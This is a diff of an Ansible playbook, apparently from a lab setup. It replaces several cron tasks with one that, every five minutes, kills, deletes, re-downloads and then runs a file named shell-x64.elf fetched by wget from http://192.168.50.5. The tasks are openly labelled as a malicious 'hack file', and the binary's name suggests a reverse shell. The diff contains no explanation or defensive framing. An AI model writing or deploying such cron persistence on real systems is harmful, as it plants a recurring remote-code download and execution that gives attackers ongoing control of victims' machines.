@@ -22,27 +22,9 @@
     path: '/etc/hosts'
     line: '192.168.50.5 client'
 
-- name: Cron job for get malicious file
+- name: Cron job for malicious file
   cron:
-   name: "hack file get"
-   minute: "1"
-   job: "if [ ! -s /home/user/shell-x64.elf ]; then wget -O /home/user/shell-x64.elf http://192.168.50.5/shell-x64.elf; fi"
-
-- name: Cron job make malicious file executable
-  cron:
-   name: "hack file executable"
-   minute: "1"
-   job: "if [ -s /home/user/shell-x64.elf ]; then chmod +x /home/user/shell-x64.elf; fi"
-
-- name: Cron job for run malicious file
-  cron:
-   name: "hack file run"
-   minute: "1"
-   job: "if ! pidof -x /home/user/shell-x64.elf; then /home/user/shell-x64.elf; fi"
-
-- name: kill every 3
-  cron: "hack kill"
-  minute: "3"
-  job: "if pidof -x /home/user/shell-x64.elf; then pkill shell-x64.elf; fi"
-
+   name: "hack file"
+   minute: "5"
+   job: "pkill shell-x64.elf && rm /home/user/shell-x64.elf && wget -O /home/user/shell-x64.elf http://192.168.50.5/shell-x64.elf && chmod +x /home/user/shell-x64.elf && /home/user/shell-x64.elf"
 ...
